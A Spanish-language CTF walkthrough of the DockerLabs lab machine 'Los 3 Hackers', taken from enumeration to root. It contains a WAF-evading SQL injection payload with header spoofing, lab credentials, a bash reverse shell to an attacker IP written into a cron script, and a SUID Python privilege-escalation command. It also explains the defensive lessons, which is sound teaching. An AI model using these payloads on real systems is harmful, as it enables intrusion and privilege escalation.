# Los 3 Hackers — DockerLabs

No todas las máquinas se rinden con un solo salto de privilegios: **Los 3 Hackers** está construida precisamente sobre esa idea, con tres cuentas encadenadas —`redhacker`, `bluehacker` y `blackhacker`— que hay que ir cayendo una tras otra hasta llegar a root. El punto de entrada es un login con un WAF básico y un rate limiting que, lejos de ser un muro, resultan bastante fáciles de esquivar con un par de trucos clásicos. A partir de ahí, cada usuario esconde la llave para el siguiente: un puerto interno accesible solo mediante *port forwarding*, un cronjob con permisos mal repartidos y, para cerrar, un binario SUID que hace de intérprete de Python con privilegios de root.

- **Plataforma:** DockerLabs

## Planteamiento

El objetivo es alcanzar acceso root completo. La máquina expone únicamente SSH y un servicio web (gunicorn) con un panel de login protegido por un WAF y un límite de intentos. El acceso inicial pasa por evadir ambas protecciones con una inyección SQL, y desde ahí localizar un archivo comprimido con credenciales. La escalada de privilegios no es un único salto sino una cadena de tres pivotes distintos, cada uno con su propia técnica: acceso a un servicio interno mediante *port forwarding*, abuso de un script ejecutado por cron con permisos de escritura mal configurados, y explotación de un binario SUID.

## Reconocimiento

### 1. Escaneo de puertos

```bash
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -vvv -Pn 172.17.0.2 -oN puertos
```

Resultados relevantes:

- **22/tcp** — SSH, OpenSSH 8.9p1 (Ubuntu)
- **80/tcp** — HTTP, servido por gunicorn

### 2. Enumeración web

En el puerto 80 se encuentra una página de inicio. Se realiza fuerza bruta de directorios con **dirb**:

```bash
dirb http://172.17.0.2/ /usr/share/dirb/wordlists/common.txt
```

Se descubren dos rutas de interés:

- `/dashboard` (redirige, código 302)
- `/login` (código 200)

Un escaneo más exhaustivo con **gobuster**, buscando además extensiones de archivo específicas, revela algo más relevante:

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,py,sh,pdf,jpg,html,zip,log
```

- `/wow.zip` (código 200)

## Explotación

### 1. Bypass del login: WAF y Rate Limiting

Al probar inyección SQL manual sobre `/login` aparecen dos protecciones activas: un filtro que bloquea ciertos patrones (WAF básico) y un límite de intentos que bloquea temporalmente tras varios fallos (Rate Limiting).

Para el Rate Limiting, se rota la cabecera `X-Forwarded-For` para simular distintas IPs de origen en cada intento. Para el WAF, se ofusca el payload intercalando comentarios SQL (`/**/`) en los puntos que el filtro reconoce como sospechosos.

El payload que finalmente evade ambas protecciones, introducido en el campo de usuario (con cualquier contraseña):

```sql
admin'/**/OR/**/'1'='1
```

Con esto se accede al `/dashboard`, donde aparece una evidencia de compromiso en la sección de incidentes:

```
Flag: {SQLi_bypass_r4t3_l1m1t_pwn3d}
```

### 2. Credenciales en archivo expuesto

En paralelo, se descarga el archivo detectado durante la enumeración:

```bash
wget http://172.17.0.2/wow.zip
unzip wow.zip
cat permission.txt
```

`permission.txt` contiene credenciales en texto plano para el primer usuario del sistema:

```
redhacker:h4ck1NNN82026!!
```

Con ellas se accede por SSH:

```bash
ssh redhacker@172.17.0.2
```

### 3. Pivote a `bluehacker` — Port Forwarding

Ya como `redhacker`, se enumeran los puertos en escucha localmente:

```bash
ss -tuln
```

Se identifica un servicio corriendo solo en `127.0.0.1:5000`, no accesible desde fuera. Para llegar a él se abre un túnel de reenvío local de puertos:

```bash
ssh -L 5000:127.0.0.1:5000 redhacker@172.17.0.2
```

Accediendo a `http://127.0.0.1:5000` desde el navegador aparece un "Internal Backup Portal" que expone credenciales temporales:

```
User: bluehacker
Password: xMPtC1EIfXp--
```

Con ellas se cambia de usuario:

```bash
su bluehacker
```

### 4. Pivote a `blackhacker` — Cronjob mal configurado

Como `bluehacker`, se enumeran las tareas programadas:

```bash
ls -la /etc/cron.d/
cat /etc/cron.d/maintenance
```

El archivo revela que `blackhacker` ejecuta de forma recurrente el script `/opt/maintenance/m.sh`. Al comprobar sus permisos:

```bash
ls -la /opt/maintenance/m.sh
```

El script pertenece a `blackhacker`, pero tiene permiso de escritura para el grupo al que pertenece `bluehacker`. Se aprovecha esto para inyectar una reverse shell:

```bash
echo "bash -c 'bash -i >& /dev/tcp/172.17.0.1/4444 0>&1'" > /opt/maintenance/m.sh
```

Con un listener activo en la máquina atacante (puerto 4444), la siguiente ejecución del cron entrega una conexión como `blackhacker`.

### 5. Root — Binario SUID

Ya como `blackhacker`, se buscan binarios con el bit SUID activo:

```bash
find / -perm -4000 2>/dev/null
```

Entre los resultados destaca uno fuera de lo común: `/usr/local/bin/syscheck`, que se comporta como un intérprete o *wrapper* de Python ejecutado con permisos de root. Se abusa de él directamente para fijar el UID a 0 y lanzar una shell:

```bash
/usr/local/bin/syscheck -c "import os; os.setuid(0); os.system('/bin/bash')"
```

Con esto se obtiene una shell como root:

```bash
cd /root
cat root.txt
```

## Resumen de Credenciales

| Usuario     | Contraseña            | Vía de obtención                                                   |
|-------------|------------------------|----------------------------------------------------------------------|
| admin       | (bypass, sin contraseña real) | Inyección SQL evadiendo WAF y Rate Limiting en `/login`             |
| redhacker   | `h4ck1NNN82026!!`      | Texto plano en `permission.txt`, dentro de `wow.zip`                 |
| bluehacker  | `xMPtC1EIfXp--`        | Portal interno en `127.0.0.1:5000`, accedido vía SSH port forwarding |
| blackhacker | (sin contraseña, reverse shell) | Script `m.sh` con permiso de escritura de grupo, ejecutado por cron |
| root        | (sin contraseña, SUID) | Binario `/usr/local/bin/syscheck` con bit SUID, ejecuta código Python arbitrario |

## Qué falló aquí

- **Protecciones de login insuficientes:** tanto el filtro anti-SQLi como el Rate Limiting son controles superficiales fáciles de evadir: el primero con ofuscación básica del payload (comentarios SQL), el segundo confiando ciegamente en una cabecera que el cliente controla (`X-Forwarded-For`). Ninguno sustituye a consultas parametrizadas ni a un rate limiting basado en la conexión real.
- **Archivo comprimido con credenciales expuesto públicamente:** `wow.zip` era accesible sin autenticación y contenía credenciales en texto plano, un fallo básico de gestión de secretos.
- **Servicio interno alcanzable con acceso lateral:** el "Internal Backup Portal" solo escuchaba en loopback, pero al no requerir ninguna autenticación adicional de red, cualquier usuario capaz de establecer un túnel SSH podía llegar a él y obtener credenciales de otra cuenta.
- **Permisos de escritura mal repartidos en un script de cron:** un script ejecutado periódicamente por un usuario con más privilegios era escribible por el grupo de un usuario con menos privilegios, permitiendo una escalada clásica de "modifica lo que se ejecuta como otro usuario".
- **Binario SUID que ejecuta código arbitrario:** un wrapper de Python con el bit SUID activo permite ejecutar cualquier instrucción del lenguaje con privilegios de root, lo cual equivale a entregar una shell de root a cualquier usuario capaz de invocarlo.

---

⚠️ Este contenido es exclusivamente educativo. No debe aplicarse en entornos reales sin autorización explícita.
